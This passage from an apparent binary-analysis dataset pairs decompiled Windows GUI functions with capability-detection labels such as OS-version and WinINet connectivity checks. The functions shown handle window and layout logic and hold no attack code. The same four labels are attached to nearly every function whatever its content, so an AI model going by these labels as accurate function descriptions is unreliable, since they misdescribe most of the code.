            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438ef8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.00421140(fcn.00438968, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00419740();\n    return;\n}\n",
        "token_count": 94
    },
    "00438f20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438f20(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004199dc();\n    if (*(in_EAX + 8) == 0) {\n        fcn.004211f4();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00439008": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00439008(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(in_EAX + 0x41) != '\\0')) {\n        iVar1 = fcn.00433a58();\n        if (iVar1 == 0) {\n            fcn.004387b8();\n            *(in_EAX + 0x41) = 1;\n        }\n        else {\n            fcn.004387b8();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00439054": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00439054(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(*0x494d28 + 0xd) != '\\0') {\n        if (*(in_EAX + 0x41) == '\\0') {\n            uVar2 = *(in_EAX + 0x30) == '\\x01';\n        }\n        else {\n            iVar1 = fcn.00433a58();\n            if (iVar1 == 0) {\n                uVar2 = fcn.00445768();\n            }\n            else {\n                uVar2 = fcn.0040484c();\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 171
    },
    "0043b7d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b7d8(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uStack51;\n    uint8_t uStack50;\n    char cStack40;\n    \n    sub.user32.dll_GetWindowLongA();\n    iVar2 = sub.user32.dll_IsIconic();\n    uVar3 = 1 - (iVar2 == 0);\n    iVar2 = sub.user32.dll_IsWindowVisible();\n    if ((iVar2 == 0) && ((in_EAX != *(*0x499c1c + 0x30) || (*(*0x499c1c + 0x5b) == '\\0')))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if ((uVar1 | uVar3) != 0) {\n        cStack40 = in_EAX;\n        sub.user32.dll_ShowWindow();\n    }\n    if (cStack40 == '\\0') {\n        sub.user32.dll_SetWindowLongA();\n    }\n    else {\n        sub.user32.dll_SetWindowLongA();\n    }\n    uStack51 = in_EAX >> 8;\n    uStack50 = in_EAX >> 0x10;\n    if (((uStack51 & uStack50) != 0) || (uVar3 != 0)) {\n        if (uVar3 == 0) {\n            sub.user32.dll_ShowWindow();\n        }\n        else {\n            sub.user32.dll_ShowWindow();\n        }\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "0043b898": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b898(void)\n\n{\n    if (*(*0x499c1c + 0x30) != 0) {\n        fcn.004455ec();\n    }\n    fcn.00446d9c();\n    fcn.00420278();\n    fcn.0042021c();\n    return;\n}\n",
        "token_count": 74
    },
    "0043ba1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ba1c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x492514) && (arg_8h != *(*0x499c1c + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x492518 == 0) {\n                        *0x492518 = arg_8h;\n                    }\n                }\n                else if (*0x49251c == 0) {\n                    *0x49251c = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 232
    },
    "0043ba80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043ba80(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x492518 = 0;\n    *0x49251c = 0;\n    *0x492514 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043ba1c, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x492518 != 0) {\n        return *0x492518;\n    }\n    return *0x49251c;\n}\n",
        "token_count": 130
    },
    "0043bd4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043bd4c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    do {\n        if (param_2 == '\\0') {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\ncode_r0x0043bd72:\n                cVar1 = fcn.004047dc();\n                if (cVar1 != '\\0') {\n                    return in_EAX;\n                }\n                return 0;\n            }\n        }\n        if (*(in_EAX + 0x30) == 0) goto code_r0x0043bd72;\n        in_EAX = *(in_EAX + 0x30);\n    } while( true );\n}\n",
        "token_count": 174
    },
    "0043bf04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043bf04(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.0043c0c4();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.00450f98();\n            if (cVar1 == '\\0') {\n                fcn.0043c61c();\n            }\n            else {\n                fcn.0043c61c();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0043bf3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bf3c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x43bfa8 == (*0x43bfa4 & *(in_EAX + 0x61)))) {\n                iVar3 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x40) + *(in_EAX + 0x48);\n                iVar2 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar3) {\n                    iVar2 = iVar3;\n                }\n                *(arg_8h + -4) = iVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0043bfac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bfac(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x43c014 == (*0x43c010 & *(in_EAX + 0x61)))) {\n                iVar2 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n                iVar1 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar2) {\n                    iVar1 = iVar2;\n                }\n                *(arg_8h + -4) = iVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "0043c018": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c018(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x96) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 0xd8))();\n        if (cVar1 == '\\0') {\n            fcn.0043c754();\n        }\n        else {\n            iVar2 = fcn.004546e8();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.004546ac();\n                        fcn.0043bf3c(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.004546ac();\n                        fcn.0043bfac(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.0043c754();\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0043c0c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043c0c4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.004585f8(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 171
    },
    "0043c130": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c130(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.0043c0fc(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x494970)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.0043c0fc(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x494970)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 225
    },
    "0043c61c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c61c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.004581a4();\n            }\n            else {\n                fcn.004581a4();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.0043bd90(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x298) != 0)) {\n                (**(**(iVar1 + 0x298) + 0xc))();\n            }\n        }\n        uVar2 = fcn.004585f8(bVar3);\n        iVar1 = (***0x494bbc)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.004585f8(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x494928)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 425
    },
    "0043c79c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c79c(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x492560);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x492538);\n    uVar1 = fcn.004585f8();\n    fcn.00431c98(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x49253c);\n        uVar1 = fcn.004585f8();\n        fcn.00431c98(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x492540);\n        uVar1 = fcn.004585f8();\n        fcn.00431c98(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x492544);\n        uVar1 = fcn.004585f8();\n        fcn.00431c98(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.00424230();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x492548);\n    uVar1 = fcn.004585f8();\n    fcn.00431c98(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 595
    },
    "0043c8a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043c8a4(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.0043c1ac();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.0043c1ac();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.0043c79c(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.004585f8(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x494ce4)(uVar3);\n    fcn.0043c61c();\n    iVar2 = fcn.0043c1ac();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 605
    },
    "0043ca84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ca84(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.00454934();\n    if (*(*0x494d28 + 0xd) == '\\0') {\n        cVar1 = fcn.0040e384();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.004585f8();\n            fcn.00431ccc(arg_8h);\n        }\n    }\n    fcn.0043cc9c();\n    return;\n}\n",
        "token_count": 121
    },
    "0043cb04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cb04(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00404620();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.00450210();\n    iVar5 = *(in_EAX + 0x250);\n    cVar2 = fcn.0043c0c4();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.0043c61c();\n    }\n    iVar5 = fcn.004546e8();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.004546ac();\n            fcn.004546ac();\n            fcn.00419740();\n            fcn.0044ff24();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00419898();\n            fcn.00451b4c(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.0043bf04();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 433
    },
    "0043cc1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cc1c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25c) < 1) {\n        fcn.0043c018();\n        fcn.0043c018();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0043cc9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cc9c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x260) == '\\0') {\n        puStack12 = 0x43ccbb;\n        var_4h = in_EAX;\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x43cd87;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x260) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.0043c22c();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.0043c22c();\n                if (cVar1 == '\\0') {\n                    fcn.0043c8a4();\n                    fcn.0043c8a4();\n                }\n                else {\n                    fcn.0043c8a4();\n                    fcn.0043c8a4();\n                }\n            }\n            else {\n                fcn.0043c8a4();\n                fcn.0043c8a4();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x260) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "0043d3d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0043d3d8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00402ee8();\n    *(in_EAX + 0x2a4) = uVar1;\n    fcn.0043c9c0();\n    *(in_EAX + 0x50) = *0x43d59c;\n    fcn.004435b0();\n    fcn.004435ec();\n    fcn.0044ff8c();\n    fcn.0044ffc0();\n    piVar2 = fcn.0042aec8();\n    *(in_EAX + 0x288) = piVar2;\n    (***0x494970)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x494970)();\n    (**(**(in_EAX + 0x288) + 0x34))();\n    iVar3 = *(in_EAX + 0x288);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = fcn.0043e088;\n    *(in_EAX + 0x278) = 2;\n    uVar1 = fcn.00425108();\n    *(in_EAX + 0x280) = uVar1;\n    fcn.0044f140();\n    *(in_EAX + 0x270) = *0x43d5a0;\n    *(in_EAX + 0x271) = 2;\n    *(in_EAX + 0x273) = 0;\n    *(in_EAX + 0x279) = 3;\n    *(in_EAX + 0x28c) = 0;\n    **(in_EAX + 0x2a4) = *(*0x499c20 + 0x40);\n    uVar1 = fcn.00448068();\n    *(*(in_EAX + 0x2a4) + 4) = uVar1;\n    iVar3 = fcn.00447e3c();\n    *(iVar3 + 0x24) = in_EAX;\n    *(iVar3 + 0x20) = fcn.00447ef0;\n    *(*(in_EAX + 0x2a4) + 8) = 0;\n    *(in_EAX + 0x27d) = 1;\n    uVar1 = fcn.00404528();\n    *(in_EAX + 0xac) = uVar1;\n    *(in_EAX + 0x329) = 0xff;\n    *(in_EAX + 0x354) = 0;\n    fcn.0043e40c();\n    fcn.00450a5c();\n    fcn.004509c0();\n    fcn.004587e4();\n    fcn.00443e74();\n    *(in_EAX + 0x34c) = 10;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 796
    },
    "0043d60c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043d60c(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x43d617;\n    *NULL = fcn.00404a1c();\n    puStack16 = 0x43d62a;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00445440();\n    if ((*(stack0xfffffff8 + 7) & 8) == 0) {\n        puStack16 = 0x43d63f;\n        (**(***0x494ce8 + 0x14))();\n    }\n    uStack20 = 0x43d70c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x9f) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xe8))();\n    }\n    fcn.00440fd0();\n    cVar1 = fcn.00458904();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xb4))();\n    }\n    fcn.00443eac();\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0040f944();\n    fcn.0040f944();\n    fcn.00447e3c();\n    fcn.00404650();\n    fcn.00402f1c();\n    fcn.0043ca38();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43d713;\n    uStack20 = 0x43d70b;\n    (**(***0x494ce8 + 0x18))();\n    return;\n}\n",
        "token_count": 465
    },
    "0043d728": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d728(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x31a) != 0) {\n        uStack28 = 0x43d769;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x318))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x358) & 2) != 0) {\n        puStack24 = 0x43d79e;\n        fcn.0043e40c();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0043d7a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
